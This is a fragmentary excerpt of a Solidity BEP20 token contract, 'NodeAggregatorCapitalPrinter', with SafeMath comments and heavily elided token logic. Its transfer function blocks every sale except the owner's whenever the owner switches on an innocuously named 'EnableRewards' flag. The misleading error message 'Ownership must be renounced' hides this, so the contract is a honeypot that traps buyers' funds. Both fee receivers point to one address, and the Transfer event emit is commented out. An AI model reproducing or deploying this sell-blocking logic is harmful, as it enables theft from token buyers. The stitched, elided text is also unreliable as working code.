...
/**
 * SAFEMATH IMPORTED LIBRARY
 */
library SafeMath {
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/421
 ...
 // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    ...
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/550
...
// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/529
...
contract NodeAggregatorCapitalPrinter is IBEP20, Auth {
    ...
    IBEP20 EP = IBEP20(0x803e78269f7F013b7D13ba13243Be10C66418a70); //NODAC
    ...
    string constant _symbol = "NODACPrinter";
    ...
    address public autoLiquidityReceiver=0x4f60D8CF5614431942aC2e31aE278c21b4D0C799; 
    address public marketingFeeReceiver=0x4f60D8CF5614431942aC2e31aE278c21b4D0C799; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!EnableRewards || sender==owner), "Ownership must be renounced");
...
//        emit Transfer(sender, recipient, amount);
    ...
    function EnableRewardsDistribution(bool value) external onlyOwner {
        EnableRewards = value;
    }
